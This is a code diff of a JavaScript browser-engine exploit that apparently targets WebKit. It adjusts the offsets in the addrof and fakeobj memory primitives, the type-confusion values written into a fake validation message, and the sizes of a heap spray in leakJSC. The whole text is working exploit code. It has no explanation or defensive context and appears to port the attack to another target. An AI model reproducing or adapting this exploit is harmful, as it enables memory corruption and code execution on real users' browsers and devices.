@@ -212,11 +212,11 @@ function write64(addr, data) {
 
 function addrof(obj) {
 	g_ab_slave.leakme = obj;
-	return read64(g_jsview_butterfly.sub(24));
+	return read64(g_jsview_butterfly.sub(16));
 }
 
 function fakeobj(addr) {
-	write64(g_jsview_butterfly.sub(24), addr);
+	write64(g_jsview_butterfly.sub(16), addr);
 	return g_ab_slave.leakme;
 }
 
@@ -245,7 +245,7 @@ function confuseTargetObjRound2() {
 	if (findTargetObj() === false)
 		die("[!] Failed to reuse target obj.");
 
-	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[3] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 4 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
 
 	setTimeout(setupRW, 6000);
 }
@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(12 * 2 * 12 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+                tmp_spray['Z'.repeat(8 * 2 * 8 - 4 - LENGTH_STRINGIMPL) + (''+i).padStart(4, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -366,7 +366,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 12 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[3] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
